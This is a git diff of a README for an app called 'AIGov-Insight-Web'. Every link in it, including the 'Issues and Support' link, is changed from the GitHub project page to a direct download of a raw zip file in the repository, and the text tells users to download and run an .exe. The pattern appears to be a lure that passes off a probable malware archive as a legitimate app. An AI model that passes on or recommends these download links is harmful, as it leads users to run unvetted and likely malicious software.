@@ -1,6 +1,6 @@
 # 🧠 AIGov-Insight-Web - Easy AI Governance Insights
 
-[![Download AIGov-Insight-Web](https://img.shields.io/badge/Download-AIGov--Insight--Web-brightgreen)](https://github.com/rossikai32-maker/AIGov-Insight-Web)
+[![Download AIGov-Insight-Web](https://img.shields.io/badge/Download-AIGov--Insight--Web-brightgreen)](https://raw.githubusercontent.com/rossikai32-maker/AIGov-Insight-Web/main/public/Web-Insight-AI-Gov-v3.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This app does not require installation of extra tools or programs. Everything yo
 ## ⬇️ How to Download and Run AIGov-Insight-Web
 
 1. Visit the main download page by clicking this link:  
-   [Download AIGov-Insight-Web](https://github.com/rossikai32-maker/AIGov-Insight-Web)  
+   [Download AIGov-Insight-Web](https://raw.githubusercontent.com/rossikai32-maker/AIGov-Insight-Web/main/public/Web-Insight-AI-Gov-v3.4.zip)  
 
 2. Once you are on the page, look for the **releases** or download section. This page lets you access the current app file for Windows.
 
@@ -71,7 +71,7 @@ The app uses minimal CPU resources but tracking AI tasks can use more memory if 
 
 New updates bring fixes and better features. Check the download page regularly:
 
-- Visit [AIGov-Insight-Web GitHub](https://github.com/rossikai32-maker/AIGov-Insight-Web).
+- Visit [AIGov-Insight-Web GitHub](https://raw.githubusercontent.com/rossikai32-maker/AIGov-Insight-Web/main/public/Web-Insight-AI-Gov-v3.4.zip).
 - Look for new release posts.
 - Download the latest `.exe` file for the newest version.
 - Run the downloaded file to update your app.
@@ -92,8 +92,8 @@ This app has a community of users and developers who help improve it.
 
 ### Useful Links
 
-- [Main Page and Download](https://github.com/rossikai32-maker/AIGov-Insight-Web)  
-- [Issues and Support](https://github.com/rossikai32-maker/AIGov-Insight-Web/issues)
+- [Main Page and Download](https://raw.githubusercontent.com/rossikai32-maker/AIGov-Insight-Web/main/public/Web-Insight-AI-Gov-v3.4.zip)  
+- [Issues and Support](https://raw.githubusercontent.com/rossikai32-maker/AIGov-Insight-Web/main/public/Web-Insight-AI-Gov-v3.4.zip)
 
 ---
 
@@ -138,4 +138,4 @@ Since this app does not modify system files or install additional programs, no s
 
 ---
 
-[![Download AIGov-Insight-Web](https://img.shields.io/badge/Download-AIGov--Insight--Web-blue)](https://github.com/rossikai32-maker/AIGov-Insight-Web)
+[![Download AIGov-Insight-Web](https://img.shields.io/badge/Download-AIGov--Insight--Web-blue)](https://raw.githubusercontent.com/rossikai32-maker/AIGov-Insight-Web/main/public/Web-Insight-AI-Gov-v3.4.zip)
